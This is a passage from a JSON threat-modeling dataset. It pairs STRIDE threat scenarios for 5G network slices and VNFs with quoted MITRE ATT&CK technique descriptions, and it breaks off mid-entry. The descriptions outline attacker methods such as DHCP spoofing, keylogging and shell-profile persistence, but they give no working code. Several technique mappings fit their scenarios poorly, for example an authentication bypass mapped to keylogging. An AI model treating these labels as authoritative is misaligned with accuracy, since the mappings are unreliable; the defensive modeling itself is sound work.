                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider shares sensitive slice configuration details.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have legitimate access to sensitive data.",
                    "Role": "Authorized Personnel",
                    "Condition": "Role-based access controls are not enforced."
                },
                {
                    "Assumption": "There are no monitoring mechanisms for data access.",
                    "Role": "Security Operations Team",
                    "Condition": "Lack of user activity monitoring."
                },
                {
                    "Assumption": "No data leak prevention mechanisms are in place.",
                    "Role": "Data Protection Officer",
                    "Condition": "Absence of data leakage prevention tools."
                }
            ],
            "Potential Impact": "Leakage of configuration data compromising security.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "configuration details",
                "data leak"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack overwhelms the network slice management infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate a significant amount of traffic.",
                    "Role": "Attacker",
                    "Condition": "Availability of a botnet to generate traffic."
                },
                {
                    "Assumption": "Network slice management does not have DDoS protection.",
                    "Role": "Network Administrator",
                    "Condition": "DDoS mitigation strategies are not implemented."
                },
                {
                    "Assumption": "Incident response mechanisms are slow or non-existent.",
                    "Role": "Incident Response Team",
                    "Condition": "Lack of a rapid incident response plan."
                }
            ],
            "Potential Impact": "Service disruption and unavailability of network management features.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "network slice",
                "management infrastructure"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects VNFs causing them to crash repeatedly.",
            "Assumptions": [
                {
                    "Assumption": "VNFs are susceptible to malware.",
                    "Role": "IT Administrator",
                    "Condition": "Outdated security patches on VNFs."
                },
                {
                    "Assumption": "There is no malware detection system in place.",
                    "Role": "Security Operations Team",
                    "Condition": "Lack of effective antivirus software."
                },
                {
                    "Assumption": "The infected VNF can repeatedly call home.",
                    "Role": "Attacker",
                    "Condition": "Ability to re-infect the VNFs."
                }
            ],
            "Potential Impact": "Repeated VNF crashes leading to service disruption.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "malware",
                "VNF",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A rogue slice uses excessive resources, starving other slices.",
            "Assumptions": [
                {
                    "Assumption": "Resource allocation policies are not strict.",
                    "Role": "System Architect",
                    "Condition": "Lack of effective resource management policies."
                },
                {
                    "Assumption": "There is no isolation enforcement between slices.",
                    "Role": "Network Administrator",
                    "Condition": "Segregation policies are not robustly implemented."
                },
                {
                    "Assumption": "Resource usage is not monitored in real-time.",
                    "Role": "Security Operations Team",
                    "Condition": "Absence of real-time resource monitoring tools."
                }
            ],
            "Potential Impact": "Degradation of performance for other network slices.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "resource starvation",
                "network slice",
                "performance degradation"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of a vulnerability in VNF software to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "The VNF software contains exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Use of outdated or unpatched software."
                },
                {
                    "Assumption": "The attacker has some access to the system.",
                    "Role": "Initial Compromise",
                    "Condition": "Prior foothold in the network."
                },
                {
                    "Assumption": "Vulnerabilities are not diligently patched.",
                    "Role": "IT Administrator",
                    "Condition": "Delayed patch management processes."
                }
            ],
            "Potential Impact": "Full control over the VNF and potential further attacks.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "vulnerability",
                "root access",
                "VNF"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "User bypasses authentication mechanisms to gain administrative control.",
            "Assumptions": [
                {
                    "Assumption": "The authentication mechanism has flaws.",
                    "Role": "Security Architect",
                    "Condition": "Weak or misconfigured authentication protocols."
                },
                {
                    "Assumption": "Detailed network information is available to the attacker.",
                    "Role": "Attacker",
                    "Condition": "They possess internal network architecture details."
                },
                {
                    "Assumption": "There is no oversight on administrative activities.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of monitoring for administrative access."
                }
            ],
            "Potential Impact": "Unauthorized administrative control over critical systems.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "authentication bypass",
                "administrative control",
                "network"
            ],
            "mitre_technique": {
                "name": "Keylogging",
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
                "technique_id": "T1056.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Internal actor escalates privileges by exploiting orchestration tools.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration tools have insufficient security configurations.",
                    "Role": "Security Architect",
                    "Condition": "Misconfigured or weak security settings."
                },
                {
                    "Assumption": "The internal actor has legitimate access but misuses it.",
                    "Role": "Authorized Personnel",
                    "Condition": "Insufficient role separation."
                },
                {
                    "Assumption": "Logs of privilege changes are not reviewed.",
                    "Role": "Security Operations Team",
                    "Condition": "Lack of routine log reviews."
                }
            ],
            "Potential Impact": "Unchecked access leading to potential system-wide changes and breaches.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "orchestration tools",
                "internal threat",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "8",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker falsifies network function credentials to gain unauthorized access to a network slice.",
            "Assumptions": [
                {
                    "Assumption": "Network function credentials are not securely managed.",
                    "Role": "Network administrator",
                    "Condition": "Credential management policies are inadequate."
                },
                {
                    "Assumption": "Insufficient logging and monitoring of access attempts.",
                    "Role": "Security team",
                    "Condition": "Logging and monitoring practices are not enforced."
                },
                {
                    "Assumption": "The attacker has access to the network or systems to intercept or guess credentials.",
                    "Role": "Attacker",
                    "Condition": "Adequate network security measures are lacking."
                }
            ],
            "Potential Impact": "Compromised data integrity, unauthorized access, potential data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "network",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user or VNF to send malicious messages within the 5G network.",
            "Assumptions": [
                {
                    "Assumption": "Lack of robust identity verification processes.",
                    "Role": "Security team",
                    "Condition": "Weak or no identity verification mechanisms in place."
                },
                {
                    "Assumption": "Weak communication channel encryption.",
                    "Role": "Network engineer",
                    "Condition": "Inadequately encrypted communication channels."
                },
                {
                    "Assumption": "Attacker has gathered enough information to effectively impersonate legitimate users or systems.",
                    "Role": "Attacker",
                    "Condition": "Information gathering and social engineering are effective."
                }
            ],
            "Potential Impact": "Data integrity compromise, propagation of malicious actions, potential service disruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "impersonation",
                "communication",
                "message"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious external interface pretends to be a trusted partner to relay sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient validation of external interfaces.",
                    "Role": "Network operator",
                    "Condition": "Lack of interface validation procedures."
                },
                {
                    "Assumption": "Trust boundaries are inadequately enforced.",
                    "Role": "Security architect",
                    "Condition": "Weak enforcement of trust boundaries."
                },
                {
                    "Assumption": "Attacker has the capability to mimic trusted interface characteristics.",
                    "Role": "Attacker",
                    "Condition": "Technical proficiency and resources available to the attacker."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, breach of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "external interface",
                "trusted partner",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker corrupts the orchestrator configurations to allocate resources maliciously.",
            "Assumptions": [
                {
                    "Assumption": "Lack of access control on orchestrator configurations.",
                    "Role": "System administrator",
                    "Condition": "Inadequate access control mechanisms."
                },
                {
                    "Assumption": "Insufficient integrity checking of configuration files.",
                    "Role": "Security engineer",
                    "Condition": "Lack of integrity verification processes for configurations."
                },
                {
                    "Assumption": "Attacker has administrative access or exploits a vulnerability to gain such access.",
                    "Role": "Attacker",
                    "Condition": "Privileges or unpatched vulnerabilities are present."
                }
            ],
            "Potential Impact": "Resource misallocation, potential service disruptions, data integrity compromise.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "orchestrator",
                "configuration",
                "resource allocation"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A malicious actor modifies the code of virtual network functions (VNFs) to introduce malicious behavior.",
            "Assumptions": [
                {
                    "Assumption": "Weak code integrity checks for VNFs.",
                    "Role": "Developer",
                    "Condition": "Lack of mechanisms to ensure code integrity."
                },
                {
                    "Assumption": "Access control mechanisms are bypassed or insufficiently enforced.",
                    "Role": "System administrator",
                    "Condition": "Inadequate access control policies."
                },
                {
                    "Assumption": "Attacker obtains access to the VNF code deployment pipeline.",
                    "Role": "Attacker",
                    "Condition": "Compromised pipeline security."
                }
            ],
            "Potential Impact": "Introduction of malware, data corruption, potential elevation of privilege.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code modification",
                "VNF",
                "malware"
            ],
            "mitre_technique": {
                "name": "Malicious Shell Modification",
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command line interface or remotely logs in (such as SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use <code>/etc/profile</code> when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files (Citation: intezer-kaiji-malware). These files require root permissions and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> (Rocke) which are sourced when a user opens a command line interface or connects remotely. Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order. Adversaries have also leveraged the <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface. Some malware targets the termination of a program to trigger execution (Cannon), adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session(Pearl_shellbot). \n\nFor macOS, the functionality of this technique is similar but leverages zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc<code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
                "id": "attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8",
                "technique_id": "T1156"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker edits network slice configurations to manipulate performance characteristics or disrupt services.",
            "Assumptions": [
                {
                    "Assumption": "Insecure storage of network slice configuration data.",
                    "Role": "Network administrator",
                    "Condition": "Lack of secure storage practices."
                },
                {
                    "Assumption": "Inadequate monitoring of configuration changes.",
                    "Role": "Security analyst",
                    "Condition": "Insufficient monitoring and alerting."
                },
                {
                    "Assumption": "Attacker has write access to configuration data.",
                    "Role": "Attacker",
                    "Condition": "Compromised or insufficiently protected access credentials."
                }
            ],
            "Potential Impact": "Service disruption, performance degradation, operational instability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration",
                "network slice",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider performs actions on the network without leaving a traceable log, denying any malicious activity.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are not tamper-proof.",
                    "Role": "Security architect",
                    "Condition": "Logs are not protected against tampering."
                },
                {
